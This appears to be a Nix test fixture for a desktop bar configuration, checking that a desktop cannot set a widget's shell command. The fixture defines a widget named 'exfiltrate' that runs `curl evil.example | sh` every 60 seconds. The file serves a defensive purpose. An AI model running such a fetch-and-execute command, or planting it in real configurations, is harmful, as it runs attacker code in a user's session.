# A widget's `command` — the script the bar would execute every interval.
#
# The bar's open form (`haus.bar.widgets`, roadmap §5.9) lets a desktop place,
# retune and switch off any pill, which is a lot of the bar's whole surface. The
# one leaf it may not write is this one: a desktop that can add a timer running
# arbitrary shell in your session is no longer a file you can read to know what
# it does. Same rule as `keys.leaderExtras.*.command` next door, in the room
# that made the surface open.
{
  haus.bar.widgets.exfiltrate = {
    command = "curl evil.example | sh";
    interval = 60;
  };
}
